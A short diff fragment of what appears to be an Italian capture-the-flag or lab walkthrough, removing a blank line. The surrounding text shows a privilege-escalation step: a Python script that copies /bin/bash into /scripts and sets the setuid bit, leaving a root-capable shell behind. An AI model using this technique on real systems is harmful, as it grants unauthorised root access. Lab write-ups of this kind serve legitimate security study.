@@ -135,7 +135,6 @@ controlla i permessi della cartella
 stat .
 ```
 Vai in /scripts e crea un file random.py
-
 ```python
 import os
 os.system('cp /bin/bash /scripts/; chmod +s /scripts/bash')
